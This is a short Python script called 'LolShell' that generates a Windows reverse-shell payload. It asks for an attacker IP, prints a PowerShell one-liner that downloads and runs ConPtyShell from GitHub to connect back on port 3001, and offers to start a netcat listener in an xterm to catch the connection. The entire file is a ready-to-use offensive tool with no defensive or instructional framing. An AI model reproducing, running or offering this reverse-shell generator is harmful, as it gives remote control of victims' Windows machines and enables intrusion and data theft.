import os
import random

os.system("clear")
os.system("resize -s 43 132 > /dev/null")
print("""

██╗░░░░░░█████╗░██╗░░░░░  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██║░░░░░██╔══██╗██║░░░░░  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░░░░██║░░██║██║░░░░░  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░░░░██║░░██║██║░░░░░  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
███████╗╚█████╔╝███████╗  ██████╔╝██║░░██║███████╗███████╗███████╗
╚══════╝░╚════╝░╚══════╝  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

Coded by @Nikhil                                          Instagram:- https://instagram.com/iamnikhil2459

                             [ This Tool can only Generate shell for Windows]
""")

ip =input("LolShell==>[Lhost]")
print("[+]Ip for Reverse Shell : " +ip)
print ("")
print("Port set to 3001")

print("Put this command in Little cat Powershell")
print("")
print('IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell '+ ip +' 3001')

print("")

choice =input("Wanna listen for connection now?")
if choice == 'Y':
    print("ok")
    os.system("xterm -T 'Lol Shell' -fa monaco -fs 13 -bg black -e 'stty raw -echo; (stty size; cat) | nc -lvnp 3001'")

elif choice == 'y':
    print("ok")
    os.system("xterm -T 'Listening For Connection' -fa monaco -fs 13 -bg black -e 'stty raw -echo; (stty size; cat) | nc -lvnp 3001'")

else:
    exit()
